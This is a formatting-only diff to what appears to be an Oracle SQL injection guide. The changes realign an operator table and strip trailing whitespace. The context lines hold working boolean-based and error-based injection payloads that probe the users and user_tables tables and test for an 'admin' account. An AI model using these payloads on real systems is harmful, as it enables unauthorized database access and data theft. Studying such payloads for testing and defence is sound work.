@@ -15,12 +15,12 @@ Conditional statements are fundamental for extracting information from Oracle da
 
 Oracle supports standard conditional operators and expressions:
 
-| Expression | Description | Example |
-|------------|-------------|---------|
-| `CASE` | Evaluates conditions and returns values | `CASE WHEN condition THEN result1 ELSE result2 END` |
-| `DECODE` | Compares expressions and returns matching value | `DECODE(expression, search1, result1, search2, result2, default)` |
-| `IF-THEN-ELSE` | PL/SQL conditional logic | `IF condition THEN action1; ELSE action2; END IF;` |
-| `AND`, `OR`, `NOT` | Logical operators | `condition1 AND condition2` |
+| Expression         | Description                                     | Example                                                           |
+| ------------------ | ----------------------------------------------- | ----------------------------------------------------------------- |
+| `CASE`             | Evaluates conditions and returns values         | `CASE WHEN condition THEN result1 ELSE result2 END`               |
+| `DECODE`           | Compares expressions and returns matching value | `DECODE(expression, search1, result1, search2, result2, default)` |
+| `IF-THEN-ELSE`     | PL/SQL conditional logic                        | `IF condition THEN action1; ELSE action2; END IF;`                |
+| `AND`, `OR`, `NOT` | Logical operators                               | `condition1 AND condition2`                                       |
 
 ### Boolean-Based Injection
 
@@ -145,8 +145,8 @@ Oracle's regular expression support can be combined with conditionals:
 
 ```sql
 -- Testing multiple conditions
-' OR (CASE 
-    WHEN (SELECT COUNT(*) FROM users)>0 AND 
+' OR (CASE
+    WHEN (SELECT COUNT(*) FROM users)>0 AND
          (SELECT COUNT(*) FROM user_tables)>10 AND
          (SELECT username FROM users WHERE rownum=1) LIKE 'a%'
     THEN 1 ELSE 0 END)=1--
@@ -158,4 +158,3 @@ Oracle's regular expression support can be combined with conditionals:
 -- Using exception handling with conditions
 ' OR (CASE WHEN (SELECT 1 FROM dual WHERE EXISTS(SELECT 1 FROM users WHERE username='admin'))=1 THEN 1 ELSE 1/0 END)=1--
 ```
-
